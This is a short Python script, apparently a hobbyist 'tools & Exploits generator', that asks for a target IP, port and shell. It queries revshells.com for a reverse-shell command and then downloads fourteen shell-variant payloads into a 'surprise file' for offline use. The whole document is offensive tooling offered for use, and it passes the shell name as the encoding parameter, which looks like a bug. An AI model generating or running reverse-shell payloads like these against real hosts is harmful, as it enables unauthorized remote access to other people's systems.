# AUTHOR : RAED AHSAN
# CREATION DATE : 12/07/2022
# AUTOMATED TELNET REVERSE SHELL GENERATOR (HYBRID) - OFFLINE&ONLINE.
# COMPANY : R-Security





import requests
import time

def telrev():
    print('\033[1m',"Welcome to R-Security tools & Exploits generator",'\033[0m')
    ip = input("enter target ip address: ")
    port = input("enter target port: ")
    shell = input("Shell?[sh,/bin/sh,bash,/bin/bash,cmd,powershell,pwsh,ash,bsh,csh,ksh,zsh,pdksh,tcsh]: ")
    print("[*] Processing your request master!")
    time.sleep(2)
    req = requests.get("https://www.revshells.com/Bash%20-i?ip={}&port={}&shell={}&encoding={}".format(ip, port, shell, shell), 'html.parser')
    print('\033[1m',req.text,'\033[0m')
    print("Request done!")
    print("Wait master, got a surprise for you!")
    time.sleep(4)
    with open("surprise_file.txt", 'w') as f:
        reqs = requests.get("https://www.revshells.com/Bash%20-i?ip=[CHANGE_TARGET_IP]&port=[CHANGE_TARGET_PORT]&shell=sh&encoding=sh",'html.parser')
        reqs1 = requests.get("https://www.revshells.com/Bash%20-i?ip=[CHANGE_TARGET_IP]&port=[CHANGE_TARGET_PORT]&shell=%2Fbin%2Fsh&encoding=%2Fbin%2Fsh",'html.parser')
        reqs2 = requests.get("https://www.revshells.com/Bash%20-i?ip=[CHANGE_TARGET_IP]&port=[CHANGE_TARGET_PORT]&shell=bash&encoding=bash",'html.parser')
        reqs3 = requests.get("https://www.revshells.com/Bash%20-i?ip=[CHANGE_TARGET_IP]&port=[CHANGE_TARGET_PORT]&shell=%2Fbin%2Fbash&encoding=%2Fbin%2Fbash",'html.parser')
        reqs4 = requests.get("https://www.revshells.com/Bash%20-i?ip=[CHANGE_TARGET_IP]&port=[CHANGE_TARGET_PORT]&shell=cmd&encoding=cmd",'html.parser')
        reqs5 = requests.get("https://www.revshells.com/Bash%20-i?ip=[CHANGE_TARGET_IP]&port=[CHANGE_TARGET_PORT]&shell=powershell&encoding=powershell",'html.parser')
        reqs6 = requests.get("https://www.revshells.com/Bash%20-i?ip=[CHANGE_TARGET_IP]&port=[CHANGE_TARGET_PORT]&shell=pwsh&encoding=pwsh",'html.parser')
        reqs7 = requests.get("https://www.revshells.com/Bash%20-i?ip=[CHANGE_TARGET_IP]&port=[CHANGE_TARGET_PORT]&shell=ash&encoding=ash",'html.parser')
        reqs8 = requests.get("https://www.revshells.com/Bash%20-i?ip=[CHANGE_TARGET_IP]&port=[CHANGE_TARGET_PORT]&shell=bsh&encoding=bsh",'html.parser')
        reqs9 = requests.get("https://www.revshells.com/Bash%20-i?ip=[CHANGE_TARGET_IP]&port=[CHANGE_TARGET_PORT]&shell=csh&encoding=csh",'html.parser')
        reqs10 = requests.get("https://www.revshells.com/Bash%20-i?ip=[CHANGE_TARGET_IP]&port=[CHANGE_TARGET_PORT]&shell=ksh&encoding=ksh",'html.parser')
        reqs11 = requests.get("https://www.revshells.com/Bash%20-i?ip=[CHANGE_TARGET_IP]&port=[CHANGE_TARGET_PORT]&shell=zsh&encoding=zsh",'html.parser')
        reqs12 = requests.get("https://www.revshells.com/Bash%20-i?ip=[CHANGE_TARGET_IP]&port=[CHANGE_TARGET_PORT]&shell=pdksh&encoding=pdksh",'html.parser')
        reqs13 = requests.get("https://www.revshells.com/Bash%20-i?ip=[CHANGE_TARGET_IP]&port=[CHANGE_TARGET_PORT]&shell=tcsh&encoding=tcsh",'html.parser')
        f.write("All the reverse shell for every shell can now be used by you OFFLINE\n\n")
        f.write("{}\n".format(reqs.text,'\n'))
        f.write("{}\n".format(reqs1.text,'\n'))
        f.write("{}\n".format(reqs2.text,'\n'))
        f.write("{}\n".format(reqs3.text,'\n'))
        f.write("{}\n".format(reqs4.text,'\n'))
        f.write("{}\n".format(reqs5.text,'\n'))
        f.write("{}\n".format(reqs6.text,'\n'))
        f.write("{}\n".format(reqs7.text,'\n'))
        f.write("{}\n".format(reqs8.text,'\n'))
        f.write("{}\n".format(reqs9.text,'\n'))
        f.write("{}\n".format(reqs10.text,'\n'))
        f.write("{}\n".format(reqs11.text,'\n'))
        f.write("{}\n".format(reqs12.text,'\n'))
        f.write("{}\n".format(reqs13.text,'\n'))

        
        f.close()
        print("[*] Surprise located in current working directoy, have a look at it master!")
        print('\033[1m',"Thank you for using R-Security tools & Exploits",'\033[0m')
        
telrev()
    